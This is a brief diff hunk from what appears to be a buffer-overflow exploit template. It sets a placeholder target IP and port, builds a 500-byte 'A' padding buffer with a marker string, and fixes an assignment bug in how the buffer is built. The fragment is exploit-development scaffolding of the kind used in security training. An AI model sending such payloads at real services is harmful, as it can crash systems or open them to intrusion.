@@ -5,7 +5,7 @@ ip = '10.0.2.57'	# Change this
 port = 1337		# Change this
 
 prefix = b''
-buffer += b'A' * 500
+buffer = b'A' * 500
 buffer += b'unique_string_goes_here'
 
 payload = prefix + buffer
